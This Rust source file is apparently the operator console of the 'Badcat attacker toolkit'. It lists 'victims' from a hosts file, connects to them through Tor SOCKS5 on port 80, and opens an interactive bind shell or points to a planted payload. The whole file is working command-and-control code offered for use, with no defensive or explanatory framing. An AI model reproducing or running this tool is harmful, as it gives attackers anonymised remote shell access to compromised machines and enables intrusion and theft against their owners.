mod setting;

extern crate clap;

use std::{path, error};
use std::io::Write;

use fast_socks5::{client::{Socks5Stream, Config}, Result as SocksResult};
use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use clap::{Arg, App};

#[tokio::main]
async fn main() -> Result<(), Box<dyn error::Error>> {
    let matches = App::new("Badcat attacker toolkit")
                            .arg(Arg::with_name("hosts")
                                .short("-f")
                                .long("--hosts-file")
                                .help("Sets hosts file")
                                .takes_value(true)
                                .required(true)
                            ).arg(Arg::with_name("tor_socks_address")
                                .short("-t")
                                .long("--socks-addr")
                                .takes_value(true)
                                .default_value("127.0.0.1:9050")
                                .help("Sets a custom tor socks address. If a socks server is not required, for example with whonix or tails, set this to none")
                            )
                            .get_matches();  

    let hosts_file = path::PathBuf::from(matches.value_of("hosts").unwrap());
    let socks_address = matches.value_of("tor_socks_address").unwrap();
    let settings = setting::from(&hosts_file)?;

    println!("Connect to your victim.");
    println!("Type help for commands.");
    println!("");

    loop {
        print!("# ");
        std::io::stdout().flush().unwrap();

        let mut command = String::new();
        std::io::stdin().read_line(&mut command)?;

        let command = command.strip_suffix("\n").unwrap();

        if command.is_empty() {
            //
        } else if command == "help" {
            println!("#### Available commands");
            println!("");
            println!("`help` - Shows this message");
            println!("`exit` - Leave this console");
            println!("`list` - List all loaded victims from settings");
            println!("`connect {{ TARGET_ID }}` - Connect to victim by ID. Example: connect 0");
        } else if command == "list" {
            for (index, setting) in settings.iter().enumerate() {
                println!("{} {}  {}", index, &setting.address, &setting.uses_payload);
            }
        } else if command == "exit" {
            println!("fair well");
            break;
        } else if command.starts_with("connect") {
            let target_id =  match command.split_once(" ") {
                Some((_, id)) => id,
                None => {
                    println!("missing TARGET_ID argument.");
                    continue;
                }
            };

            match target_id.parse::<usize>() {
                Ok(target_id) => {
                    if target_id < settings.len() {
                        let target = &settings[target_id];
                        
                        let stream = connect_to(&target, socks_address).await?;

                        if target.uses_payload {
                            println!("Your payload should be accessible now at: {}:80", target.address);
                        } else {
                            bind_shell(stream).await?;
                        }
                    } else {
                        println!("ERROR: select an existing TARGET_ID");
                    }
                },
                Err(_) => println!("ERROR: invalid TARGET_ID: {}", target_id)
            };
        } else {
            println!("ERROR: unknow command: {}", command);
        }
    }

    Ok(())
}

async fn pipe_io<R, W>(mut r: R, mut w: W)
where R: io::AsyncRead + Unpin + Send,
      W: io::AsyncWrite + Unpin + Send
{
    let mut buf = [0; 1024];

    loop {
        let len = match r.read(&mut buf).await {
            // socket closed
            Ok(n) if n == 0 => break,
            Ok(n) => n,
            Err(_) => break
        };

        if let Err(_) = w.write(&buf[..len]).await {
            break;
        }

        if let Err(_) = w.flush().await {
            break;
        };
    }
}

async fn connect_to(
    setting: &setting::Setting,
    socks_address: &str
) -> SocksResult<TcpStream, Box<dyn error::Error>> {
    let uses_socks = socks_address != "none";
    println!("trying to connect...");

    let stream = if uses_socks {
        Socks5Stream::connect(
            socks_address,
            String::from(&setting.address),
            80,
            Config::default()
        ).await?.get_socket()
    } else {
        TcpStream::connect(
            format!("{}:80", &setting.address)
        ).await?
    };

    println!("connected to: {:?}", stream.peer_addr()?);

    Ok(stream)
}

async fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
    println!("opening the default badcat shell...");
    println!("");
    println!("note: when you exit the shell, keep pressing Enter until it exits");
    println!("");
    println!("");
    println!("");

    let (stream_reader, stream_writer) = stream.into_split();

    tokio::join!(
        // read from socket, write to stdout
        pipe_io(stream_reader, io::stdout()),

        // read from stdin, write to socket
        pipe_io(io::stdin(), stream_writer),
    );

    println!("connection closed.");

    Ok(())
}
